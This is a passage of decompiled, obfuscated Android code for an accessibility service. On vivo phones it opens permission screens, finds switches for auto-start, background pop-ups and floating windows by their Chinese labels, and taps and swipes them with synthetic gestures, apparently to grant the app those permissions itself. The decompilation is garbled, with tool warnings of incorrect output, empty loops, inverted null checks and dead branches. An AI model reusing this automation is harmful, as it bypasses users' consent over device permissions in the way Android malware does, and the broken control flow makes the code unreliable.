                        vivoSteps$openSoftPermissionDetailActivity$1.f54941a0 = c0371a8;
                        vivoSteps$openSoftPermissionDetailActivity$1.f54942a1 = i;
                        vivoSteps$openSoftPermissionDetailActivity$1.f54945a4 = 2;
                        if (m212385g6(c0371a8, vivoSteps$openSoftPermissionDetailActivity$1) != coroutineSingletons) {
                            rootInActiveWindow = c0371a8.f55139a0.getRootInActiveWindow();
                            if (rootInActiveWindow != null) {
                                CharSequence packageName = rootInActiveWindow.getPackageName();
                                if (packageName == null || (string = packageName.toString()) == null) {
                                    string = "";
                                }
                                if (AbstractC0779a1.m213652a5(string, "permissionmanager", true)) {
                                    rootInActiveWindow.recycle();
                                    return Boolean.TRUE;
                                }
                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText4 = rootInActiveWindow.findAccessibilityNodeInfosByText("自启动");
                                if (listFindAccessibilityNodeInfosByText4 == null || listFindAccessibilityNodeInfosByText4.isEmpty()) {
                                    listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("后台弹出界面");
                                    if (listFindAccessibilityNodeInfosByText != null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                                        listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText("悬浮窗");
                                        if (listFindAccessibilityNodeInfosByText2 == null || listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                            listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText("单项权限");
                                            if (listFindAccessibilityNodeInfosByText3 != null && !listFindAccessibilityNodeInfosByText3.isEmpty()) {
                                                it = listFindAccessibilityNodeInfosByText3.iterator();
                                                while (it.hasNext()) {
                                                    if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                                                        break;
                                                    }
                                                }
                                            }
                                            t60.m214726f4(c0371a8.f55141a2, "[openSoftPermissionDetailActivity] ⚠️ 页面未切换，当前包名: ".concat(string));
                                            rootInActiveWindow.recycle();
                                            if (AbstractC0779a1.m213652a5(string, "settings", true)) {
                                                c0371a8.f55139a0.performGlobalAction(1);
                                                vivoSteps$openSoftPermissionDetailActivity$1.f54941a0 = c0371a8;
                                                vivoSteps$openSoftPermissionDetailActivity$1.f54942a1 = i;
                                                vivoSteps$openSoftPermissionDetailActivity$1.f54945a4 = 3;
                                            }
                                        } else {
                                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText2.iterator();
                                            while (it2.hasNext()) {
                                                if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                                                    break;
                                                }
                                            }
                                            listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText("单项权限");
                                            if (listFindAccessibilityNodeInfosByText3 != null) {
                                                it = listFindAccessibilityNodeInfosByText3.iterator();
                                                while (it.hasNext()) {
                                                }
                                            }
                                            t60.m214726f4(c0371a8.f55141a2, "[openSoftPermissionDetailActivity] ⚠️ 页面未切换，当前包名: ".concat(string));
                                            rootInActiveWindow.recycle();
                                            if (AbstractC0779a1.m213652a5(string, "settings", true)) {
                                            }
                                        }
                                    } else {
                                        Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                                        while (it3.hasNext()) {
                                            if (((AccessibilityNodeInfo) it3.next()).isVisibleToUser()) {
                                                break;
                                            }
                                        }
                                        listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText("悬浮窗");
                                        if (listFindAccessibilityNodeInfosByText2 == null) {
                                            listFindAccessibilityNodeInfosByText3 = rootInActiveWindow.findAccessibilityNodeInfosByText("单项权限");
                                            if (listFindAccessibilityNodeInfosByText3 != null) {
                                            }
                                            t60.m214726f4(c0371a8.f55141a2, "[openSoftPermissionDetailActivity] ⚠️ 页面未切换，当前包名: ".concat(string));
                                            rootInActiveWindow.recycle();
                                            if (AbstractC0779a1.m213652a5(string, "settings", true)) {
                                            }
                                        }
                                    }
                                } else {
                                    Iterator<T> it4 = listFindAccessibilityNodeInfosByText4.iterator();
                                    while (it4.hasNext()) {
                                        if (((AccessibilityNodeInfo) it4.next()).isVisibleToUser()) {
                                            break;
                                        }
                                    }
                                    listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("后台弹出界面");
                                    if (listFindAccessibilityNodeInfosByText != null) {
                                        listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText("悬浮窗");
                                        if (listFindAccessibilityNodeInfosByText2 == null) {
                                        }
                                    }
                                }
                                if (i < 4) {
                                    t60.m214704c5(c0371a8.f55141a2, "[openSoftPermissionDetailActivity] ❌ 3次尝试后仍未能打开页面");
                                    return Boolean.FALSE;
                                }
                            }
                            i++;
                            if (i < 4) {
                            }
                        }
                    }
                    return coroutineSingletons;
                }
            }
        }
    }

    /* renamed from: e9 */
    public final boolean m212421e9(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
            SystemClock.sleep(200L);
            return true;
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        for (int i = 0; i < 10 && parent != null; i++) {
            if (parent.isClickable() && parent.performAction(16)) {
                SystemClock.sleep(200L);
                return true;
            }
            parent = parent.getParent();
        }
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        if (rectM24a5.width() <= 0 || rectM24a5.height() <= 0) {
            return false;
        }
        int iCenterX = rectM24a5.centerX();
        int iCenterY = rectM24a5.centerY();
        t60.m214704c5(this.f55141a2, AbstractC0003a2.m31b2("[performClick] 使用坐标点击: (", iCenterX, ", ", iCenterY, ")"));
        m212424f2(iCenterX, iCenterY);
        return true;
    }

    /* renamed from: f0 */
    public final void m212422f0(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        m212424f2((int) rectM24a5.exactCenterX(), (int) rectM24a5.exactCenterY());
    }

    /* renamed from: f1 */
    public final Boolean m212423f1(float f, float f2) throws InterruptedException {
        boolean z;
        try {
            Path path = new Path();
            path.moveTo(f, f2);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 50L));
            GestureDescription gestureDescriptionBuild = builder.build();
            Ref$BooleanRef ref$BooleanRef = new Ref$BooleanRef();
            CountDownLatch countDownLatch = new CountDownLatch(1);
            this.f55139a0.dispatchGesture(gestureDescriptionBuild, new C0619ie(ref$BooleanRef, countDownLatch, 3), null);
            countDownLatch.await(1000L, TimeUnit.MILLISECONDS);
            z = ref$BooleanRef.f57622a0;
        } catch (Exception e) {
            t60.m214705c6(this.f55141a2, "[电池] ❌ 手势点击异常", e);
            z = false;
        }
        return Boolean.valueOf(z);
    }

    /* renamed from: f2 */
    public final void m212424f2(final int i, final int i2) throws InterruptedException {
        final CountDownLatch countDownLatch = new CountDownLatch(1);
        final int i3 = 0;
        new Handler(Looper.getMainLooper()).post(new Runnable() { // from class: qd1
            @Override // java.lang.Runnable
            public final void run() {
                int i4 = i;
                int i5 = i2;
                C0371a8 c0371a8 = this;
                CountDownLatch countDownLatch2 = countDownLatch;
                int i6 = i3;
                try {
                    Path path = new Path();
                    path.moveTo(i4, i5);
                    GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path, 10L, 50L);
                    GestureDescription.Builder builder = new GestureDescription.Builder();
                    builder.addStroke(strokeDescription);
                    SystemClock.sleep(50L);
                    c0371a8.f55139a0.dispatchGesture(builder.build(), new sd1(i4, i5, i6, c0371a8, countDownLatch2), null);
                } catch (Exception e) {
                    t60.m214704c5(c0371a8.f55141a2, "[f] ❌ 点击异常: " + e.getMessage());
                    countDownLatch2.countDown();
                }
            }
        });
        SystemClock.sleep(100L);
        try {
            countDownLatch.await((1 * 1000) + 3000, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            t60.m214704c5(this.f55141a2, "[f] 等待中断: " + e.getMessage());
            Thread.currentThread().interrupt();
        }
    }

    /* renamed from: f3 */
    public final void m212425f3(boolean z) {
        try {
            Path path = new Path();
            float f = this.f55140a1.getResources().getDisplayMetrics().widthPixels * 0.1f;
            if (z) {
                path.moveTo(f, m212414e1() * 0.85f);
                path.lineTo(f, m212414e1() * 0.25f);
            } else {
                path.moveTo(f, m212414e1() / 4);
                path.lineTo(f, m212414e1() - 600);
            }
            this.f55139a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 300L)).build(), new td1(this, 0), null);
            SystemClock.sleep(300L);
        } catch (Exception e) {
            tz0.m214807a7("[滑动] 失败: ", e.getMessage(), this.f55141a2);
        }
    }

    /* renamed from: f4 */
    public final void m212426f4() {
        Context context = this.f55140a1;
        String str = this.f55141a2;
        try {
            float f = context.getResources().getDisplayMetrics().widthPixels * 0.85f;
            float f2 = context.getResources().getDisplayMetrics().widthPixels * 0.15f;
            float fM212414e1 = m212414e1() * 0.45f;
            t60.m214704c5(str, "[横向滑动] VIVO华为方式: (" + f + ", " + fM212414e1 + ") -> (" + f2 + ", " + fM212414e1 + "), 时长=400ms");
            Path path = new Path();
            path.moveTo(f, fM212414e1);
            path.lineTo(f2, fM212414e1);
            this.f55139a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 400L)).build(), new td1(this, 1), null);
        } catch (Exception e) {
            tz0.m214807a7("[横向滑动] 失败: ", e.getMessage(), str);
        }
    }

    /* renamed from: f5 */
    public final Object m212427f5(float f, float f2, float f3, InterfaceC0876mv interfaceC0876mv) {
        C0530gb c0530gb = new C0530gb(1, kj1.m213575c2(interfaceC0876mv));
        c0530gb.m212926b6();
        Ref$BooleanRef ref$BooleanRef = new Ref$BooleanRef();
        Path path = new Path();
        path.moveTo(f, f2);
        path.lineTo(f, f3);
        GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, 500L)).build();
        Handler handler = new Handler(Looper.getMainLooper());
        RunnableC0818lf runnableC0818lf = new RunnableC0818lf(ref$BooleanRef, this, c0530gb, 5);
        handler.postDelayed(runnableC0818lf, 500 + 2000);
        if (!this.f55139a0.dispatchGesture(gestureDescriptionBuild, new ud1(handler, runnableC0818lf, ref$BooleanRef, this, c0530gb), null)) {
            handler.removeCallbacks(runnableC0818lf);
            if (!ref$BooleanRef.f57622a0) {
                ref$BooleanRef.f57622a0 = true;
                t60.m214704c5(this.f55141a2, "[VIVO下滑手势] ❌ dispatchGesture返回false");
                int i = Result.f57558a1;
                c0530gb.resumeWith(Boolean.FALSE);
            }
        }
        Object objM212925b5 = c0530gb.m212925b5();
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        return objM212925b5;
    }

    /* JADX WARN: Code restructure failed: missing block: B:21:0x0062, code lost:
    
        if (p000.b81.m210571b1(100, r0) == r1) goto L30;
     */
    /* JADX WARN: Code restructure failed: missing block: B:29:0x0085, code lost:
    
        if (p000.b81.m210571b1(200, r0) != r1) goto L31;
     */
    /* JADX WARN: Removed duplicated region for block: B:20:0x004f  */
    /* JADX WARN: Removed duplicated region for block: B:24:0x0067  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:21:0x0062 -> B:23:0x0065). Please report as a decompilation issue!!! */
    /* renamed from: f6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212428f6(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$returnToHome$1 vivoSteps$returnToHome$1;
        int i;
        int i2;
        C0371a8 c0371a8;
        C0371a8 c0371a82;
        if (continuationImpl instanceof VivoSteps$returnToHome$1) {
            vivoSteps$returnToHome$1 = (VivoSteps$returnToHome$1) continuationImpl;
            int i3 = vivoSteps$returnToHome$1.f54951a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                vivoSteps$returnToHome$1.f54951a5 = i3 - Integer.MIN_VALUE;
            } else {
                vivoSteps$returnToHome$1 = new VivoSteps$returnToHome$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$returnToHome$1.f54949a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = vivoSteps$returnToHome$1.f54951a5;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            i = 0;
            i2 = 6;
            c0371a8 = this;
            if (i >= i2) {
            }
            return coroutineSingletons;
        }
        if (i4 == 1) {
            i = vivoSteps$returnToHome$1.f54948a2;
            i2 = vivoSteps$returnToHome$1.f54947a1;
            C0371a8 c0371a83 = vivoSteps$returnToHome$1.f54946a0;
            kg1.m213544f4(obj);
            c0371a8 = c0371a83;
            i++;
            if (i >= i2) {
                c0371a8.f55139a0.performGlobalAction(1);
                vivoSteps$returnToHome$1.f54946a0 = c0371a8;
                vivoSteps$returnToHome$1.f54947a1 = i2;
                vivoSteps$returnToHome$1.f54948a2 = i;
                vivoSteps$returnToHome$1.f54951a5 = 1;
            } else {
                vivoSteps$returnToHome$1.f54946a0 = c0371a8;
                vivoSteps$returnToHome$1.f54951a5 = 2;
                if (b81.m210571b1(500L, vivoSteps$returnToHome$1) != coroutineSingletons) {
                    c0371a82 = c0371a8;
                    c0371a82.f55139a0.performGlobalAction(2);
                    vivoSteps$returnToHome$1.f54946a0 = null;
                    vivoSteps$returnToHome$1.f54951a5 = 3;
                }
            }
            return coroutineSingletons;
        }
        if (i4 != 2) {
            if (i4 != 3) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return C1351vv.f60710b1;
        }
        c0371a82 = vivoSteps$returnToHome$1.f54946a0;
        kg1.m213544f4(obj);
        c0371a82.f55139a0.performGlobalAction(2);
        vivoSteps$returnToHome$1.f54946a0 = null;
        vivoSteps$returnToHome$1.f54951a5 = 3;
    }

    /* renamed from: f7 */
    public final C1351vv m212429f7() {
        AccessibilityNodeInfo accessibilityNodeInfoM212379d4;
        C1351vv c1351vv = C1351vv.f60710b1;
        AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
        if (rootInActiveWindow == null || (accessibilityNodeInfoM212379d4 = m212379d4(rootInActiveWindow)) == null) {
            m212425f3(false);
            return c1351vv;
        }
        try {
            accessibilityNodeInfoM212379d4.performAction(Segment.SIZE);
            SystemClock.sleep(200L);
            return c1351vv;
        } catch (Exception e) {
            tz0.m214807a7("[系统滑动] 失败: ", e.getMessage(), this.f55141a2);
            return c1351vv;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:35:0x00d0, code lost:
    
        if (p000.b81.m210571b1(300, r4) != r5) goto L37;
     */
    /* JADX WARN: Removed duplicated region for block: B:39:0x00d7  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x0108 A[PHI: r1 r3 r6 r13 r14
      0x0108: PHI (r1v12 int) = (r1v8 int), (r1v16 int) binds: [B:44:0x0105, B:18:0x0059] A[DONT_GENERATE, DONT_INLINE]
      0x0108: PHI (r3v9 int) = (r3v6 int), (r3v11 int) binds: [B:44:0x0105, B:18:0x0059] A[DONT_GENERATE, DONT_INLINE]
      0x0108: PHI (r6v12 boolean) = (r6v9 boolean), (r6v14 boolean) binds: [B:44:0x0105, B:18:0x0059] A[DONT_GENERATE, DONT_INLINE]
      0x0108: PHI (r13v9 java.lang.String) = (r13v6 java.lang.String), (r13v11 java.lang.String) binds: [B:44:0x0105, B:18:0x0059] A[DONT_GENERATE, DONT_INLINE]
      0x0108: PHI (r14v6 com.storm.safe.rock.service.modules.yw5xud.a8) = (r14v2 com.storm.safe.rock.service.modules.yw5xud.a8), (r14v7 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:44:0x0105, B:18:0x0059] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:48:0x010e  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x011d  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x0124  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x0127  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x014f A[PHI: r1 r3 r6 r13
      0x014f: PHI (r1v22 int) = (r1v18 int), (r1v26 int) binds: [B:59:0x014c, B:14:0x003b] A[DONT_GENERATE, DONT_INLINE]
      0x014f: PHI (r3v17 boolean) = (r3v13 boolean), (r3v18 boolean) binds: [B:59:0x014c, B:14:0x003b] A[DONT_GENERATE, DONT_INLINE]
      0x014f: PHI (r6v18 java.lang.String) = (r6v16 java.lang.String), (r6v19 java.lang.String) binds: [B:59:0x014c, B:14:0x003b] A[DONT_GENERATE, DONT_INLINE]
      0x014f: PHI (r13v15 com.storm.safe.rock.service.modules.yw5xud.a8) = (r13v13 com.storm.safe.rock.service.modules.yw5xud.a8), (r13v16 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:59:0x014c, B:14:0x003b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0155  */
    /* JADX WARN: Removed duplicated region for block: B:67:0x0165  */
    /* JADX WARN: Removed duplicated region for block: B:68:0x0167  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:44:0x0105 -> B:46:0x0108). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:59:0x014c -> B:61:0x014f). Please report as a decompilation issue!!! */
    /* renamed from: f8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212430f8(int i, String str, ContinuationImpl continuationImpl, boolean z) throws Throwable {
        VivoSteps$scrollToggleSwitch$1 vivoSteps$scrollToggleSwitch$1;
        C0371a8 c0371a8;
        String str2;
        int i2;
        int i3;
        int i4;
        boolean z2;
        String str3;
        C0371a8 c0371a82;
        int i5;
        boolean z3 = z;
        if (continuationImpl instanceof VivoSteps$scrollToggleSwitch$1) {
            vivoSteps$scrollToggleSwitch$1 = (VivoSteps$scrollToggleSwitch$1) continuationImpl;
            int i6 = vivoSteps$scrollToggleSwitch$1.f54959a7;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                vivoSteps$scrollToggleSwitch$1.f54959a7 = i6 - Integer.MIN_VALUE;
            } else {
                vivoSteps$scrollToggleSwitch$1 = new VivoSteps$scrollToggleSwitch$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$scrollToggleSwitch$1.f54957a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (vivoSteps$scrollToggleSwitch$1.f54959a7) {
            case 0:
                kg1.m213544f4(obj);
                if (m212412d9(str) == null) {
                    vivoSteps$scrollToggleSwitch$1.f54952a0 = this;
                    vivoSteps$scrollToggleSwitch$1.f54953a1 = str;
                    vivoSteps$scrollToggleSwitch$1.f54954a2 = z3;
                    vivoSteps$scrollToggleSwitch$1.f54955a3 = i;
                    vivoSteps$scrollToggleSwitch$1.f54959a7 = 2;
                    m212429f7();
                    if (C1351vv.f60710b1 != coroutineSingletons) {
                        c0371a8 = this;
                        str2 = str;
                        i2 = i;
                        vivoSteps$scrollToggleSwitch$1.f54952a0 = c0371a8;
                        vivoSteps$scrollToggleSwitch$1.f54953a1 = str2;
                        vivoSteps$scrollToggleSwitch$1.f54954a2 = z3;
                        vivoSteps$scrollToggleSwitch$1.f54955a3 = i2;
                        vivoSteps$scrollToggleSwitch$1.f54959a7 = 3;
                        break;
                    }
                } else {
                    vivoSteps$scrollToggleSwitch$1.f54959a7 = 1;
                    Boolean boolM212432g0 = m212432g0(str, z3);
                    if (boolM212432g0 != coroutineSingletons) {
                        return boolM212432g0;
                    }
                }
                return coroutineSingletons;
            case 1:
                kg1.m213544f4(obj);
                return obj;
            case 2:
                i2 = vivoSteps$scrollToggleSwitch$1.f54955a3;
                z3 = vivoSteps$scrollToggleSwitch$1.f54954a2;
                str2 = vivoSteps$scrollToggleSwitch$1.f54953a1;
                c0371a8 = vivoSteps$scrollToggleSwitch$1.f54952a0;
                kg1.m213544f4(obj);
                vivoSteps$scrollToggleSwitch$1.f54952a0 = c0371a8;
                vivoSteps$scrollToggleSwitch$1.f54953a1 = str2;
                vivoSteps$scrollToggleSwitch$1.f54954a2 = z3;
                vivoSteps$scrollToggleSwitch$1.f54955a3 = i2;
                vivoSteps$scrollToggleSwitch$1.f54959a7 = 3;
                break;
            case 3:
                i2 = vivoSteps$scrollToggleSwitch$1.f54955a3;
                z3 = vivoSteps$scrollToggleSwitch$1.f54954a2;
                str2 = vivoSteps$scrollToggleSwitch$1.f54953a1;
                c0371a8 = vivoSteps$scrollToggleSwitch$1.f54952a0;
                kg1.m213544f4(obj);
                int i7 = 0;
                if (i7 >= i2) {
                    c0371a8.m212425f3(true);
                    vivoSteps$scrollToggleSwitch$1.f54952a0 = c0371a8;
                    vivoSteps$scrollToggleSwitch$1.f54953a1 = str2;
                    vivoSteps$scrollToggleSwitch$1.f54954a2 = z3;
                    vivoSteps$scrollToggleSwitch$1.f54955a3 = i2;
                    vivoSteps$scrollToggleSwitch$1.f54956a4 = i7;
                    vivoSteps$scrollToggleSwitch$1.f54959a7 = 4;
                    if (b81.m210571b1(500L, vivoSteps$scrollToggleSwitch$1) != coroutineSingletons) {
                        c0371a82 = c0371a8;
                        str3 = str2;
                        z2 = z3;
                        i4 = i2;
                        i3 = i7;
                        vivoSteps$scrollToggleSwitch$1.f54952a0 = c0371a82;
                        vivoSteps$scrollToggleSwitch$1.f54953a1 = str3;
                        vivoSteps$scrollToggleSwitch$1.f54954a2 = z2;
                        vivoSteps$scrollToggleSwitch$1.f54955a3 = i4;
                        vivoSteps$scrollToggleSwitch$1.f54956a4 = i3;
                        vivoSteps$scrollToggleSwitch$1.f54959a7 = 5;
                        if (m212385g6(c0371a82, vivoSteps$scrollToggleSwitch$1) != coroutineSingletons) {
                            if (c0371a82.m212412d9(str3) == null) {
                                vivoSteps$scrollToggleSwitch$1.f54952a0 = null;
                                vivoSteps$scrollToggleSwitch$1.f54953a1 = null;
                                vivoSteps$scrollToggleSwitch$1.f54959a7 = 6;
                                Boolean boolM212432g02 = c0371a82.m212432g0(str3, z2);
                                if (boolM212432g02 != coroutineSingletons) {
                                    return boolM212432g02;
                                }
                            } else {
                                i7 = i3 + 1;
                                i2 = i4;
                                z3 = z2;
                                str2 = str3;
                                c0371a8 = c0371a82;
                                if (i7 >= i2) {
                                    i5 = 0;
                                    if (i5 >= 3) {
                                        c0371a8.m212425f3(false);
                                        vivoSteps$scrollToggleSwitch$1.f54952a0 = c0371a8;
                                        vivoSteps$scrollToggleSwitch$1.f54953a1 = str2;
                                        vivoSteps$scrollToggleSwitch$1.f54954a2 = z3;
                                        vivoSteps$scrollToggleSwitch$1.f54955a3 = i5;
                                        vivoSteps$scrollToggleSwitch$1.f54959a7 = 7;
                                        if (b81.m210571b1(500L, vivoSteps$scrollToggleSwitch$1) != coroutineSingletons) {
                                            vivoSteps$scrollToggleSwitch$1.f54952a0 = c0371a8;
                                            vivoSteps$scrollToggleSwitch$1.f54953a1 = str2;
                                            vivoSteps$scrollToggleSwitch$1.f54954a2 = z3;
                                            vivoSteps$scrollToggleSwitch$1.f54955a3 = i5;
                                            vivoSteps$scrollToggleSwitch$1.f54959a7 = 8;
                                            if (m212385g6(c0371a8, vivoSteps$scrollToggleSwitch$1) != coroutineSingletons) {
                                                if (c0371a8.m212412d9(str2) == null) {
                                                    vivoSteps$scrollToggleSwitch$1.f54952a0 = null;
                                                    vivoSteps$scrollToggleSwitch$1.f54953a1 = null;
                                                    vivoSteps$scrollToggleSwitch$1.f54959a7 = 9;
                                                    Boolean boolM212432g03 = c0371a8.m212432g0(str2, z3);
                                                    if (boolM212432g03 != coroutineSingletons) {
                                                        return boolM212432g03;
                                                    }
                                                } else {
                                                    i5++;
                                                    if (i5 >= 3) {
                                                        t60.m214726f4(c0371a8.f55141a2, "[scrollToggleSwitch] ❌ 滚动查找失败: '" + str2 + "'");
                                                        return Boolean.FALSE;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    return coroutineSingletons;
                }
            case 4:
                i3 = vivoSteps$scrollToggleSwitch$1.f54956a4;
                i4 = vivoSteps$scrollToggleSwitch$1.f54955a3;
                z2 = vivoSteps$scrollToggleSwitch$1.f54954a2;
                str3 = vivoSteps$scrollToggleSwitch$1.f54953a1;
                c0371a82 = vivoSteps$scrollToggleSwitch$1.f54952a0;
                kg1.m213544f4(obj);
                vivoSteps$scrollToggleSwitch$1.f54952a0 = c0371a82;
                vivoSteps$scrollToggleSwitch$1.f54953a1 = str3;
                vivoSteps$scrollToggleSwitch$1.f54954a2 = z2;
                vivoSteps$scrollToggleSwitch$1.f54955a3 = i4;
                vivoSteps$scrollToggleSwitch$1.f54956a4 = i3;
                vivoSteps$scrollToggleSwitch$1.f54959a7 = 5;
                if (m212385g6(c0371a82, vivoSteps$scrollToggleSwitch$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                i3 = vivoSteps$scrollToggleSwitch$1.f54956a4;
                i4 = vivoSteps$scrollToggleSwitch$1.f54955a3;
                z2 = vivoSteps$scrollToggleSwitch$1.f54954a2;
                str3 = vivoSteps$scrollToggleSwitch$1.f54953a1;
                c0371a82 = vivoSteps$scrollToggleSwitch$1.f54952a0;
                kg1.m213544f4(obj);
                if (c0371a82.m212412d9(str3) == null) {
                }
                break;
            case 6:
                kg1.m213544f4(obj);
                return obj;
            case 7:
                i5 = vivoSteps$scrollToggleSwitch$1.f54955a3;
                z3 = vivoSteps$scrollToggleSwitch$1.f54954a2;
                str2 = vivoSteps$scrollToggleSwitch$1.f54953a1;
                c0371a8 = vivoSteps$scrollToggleSwitch$1.f54952a0;
                kg1.m213544f4(obj);
                vivoSteps$scrollToggleSwitch$1.f54952a0 = c0371a8;
                vivoSteps$scrollToggleSwitch$1.f54953a1 = str2;
                vivoSteps$scrollToggleSwitch$1.f54954a2 = z3;
                vivoSteps$scrollToggleSwitch$1.f54955a3 = i5;
                vivoSteps$scrollToggleSwitch$1.f54959a7 = 8;
                if (m212385g6(c0371a8, vivoSteps$scrollToggleSwitch$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                i5 = vivoSteps$scrollToggleSwitch$1.f54955a3;
                z3 = vivoSteps$scrollToggleSwitch$1.f54954a2;
                str2 = vivoSteps$scrollToggleSwitch$1.f54953a1;
                c0371a8 = vivoSteps$scrollToggleSwitch$1.f54952a0;
                kg1.m213544f4(obj);
                if (c0371a8.m212412d9(str2) == null) {
                }
                break;
            case 9:
                kg1.m213544f4(obj);
                return obj;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:28:0x00a8, code lost:
    
        if (p000.b81.m210571b1(300, r0) == r1) goto L29;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: f9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212431f9(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$searchAppInOverlayList$1 vivoSteps$searchAppInOverlayList$1;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfo;
        if (continuationImpl instanceof VivoSteps$searchAppInOverlayList$1) {
            vivoSteps$searchAppInOverlayList$1 = (VivoSteps$searchAppInOverlayList$1) continuationImpl;
            int i = vivoSteps$searchAppInOverlayList$1.f54965a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$searchAppInOverlayList$1.f54965a5 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$searchAppInOverlayList$1 = new VivoSteps$searchAppInOverlayList$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$searchAppInOverlayList$1.f54963a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = vivoSteps$searchAppInOverlayList$1.f54965a5;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
            String str2 = this.f55141a2;
            if (rootInActiveWindow == null) {
                t60.m214704c5(str2, "[悬浮窗权限] ❌ getRootNode返回null");
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/search_src_text");
            if (listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                t60.m214726f4(str2, "[悬浮窗权限] ⚠️ 未找到搜索框，尝试直接查找应用");
                rootInActiveWindow.recycle();
                return Boolean.TRUE;
            }
            accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId.get(0);
            accessibilityNodeInfo.performAction(1);
            vivoSteps$searchAppInOverlayList$1.f54960a0 = str;
            vivoSteps$searchAppInOverlayList$1.f54961a1 = rootInActiveWindow;
            vivoSteps$searchAppInOverlayList$1.f54962a2 = accessibilityNodeInfo;
            vivoSteps$searchAppInOverlayList$1.f54965a5 = 1;
            if (b81.m210571b1(300L, vivoSteps$searchAppInOverlayList$1) != coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i2 != 1) {
            if (i2 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return Boolean.TRUE;
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = vivoSteps$searchAppInOverlayList$1.f54962a2;
        rootInActiveWindow = vivoSteps$searchAppInOverlayList$1.f54961a1;
        String str3 = vivoSteps$searchAppInOverlayList$1.f54960a0;
        kg1.m213544f4(obj);
